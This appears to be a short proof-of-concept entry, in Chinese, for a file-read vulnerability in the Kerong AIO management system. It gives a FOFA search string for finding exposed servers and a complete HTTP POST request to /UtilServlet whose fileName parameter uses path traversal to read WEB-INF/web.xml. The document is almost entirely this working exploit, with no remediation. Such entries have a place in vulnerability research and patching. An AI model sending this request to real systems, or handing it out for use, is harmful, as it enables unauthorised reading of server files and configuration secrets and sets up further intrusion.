# 科荣 AIO管理系统 文件读取漏洞

## 网络测绘

fofa: app="科荣AIO管理系统"

## POC / EXP

```
POST /UtilServlet HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Upgrade-Insecure-Requests: 1
Content-Length: 63

operation=readErrorExcel&fileName=../../website/WEB-INF/web.xml
```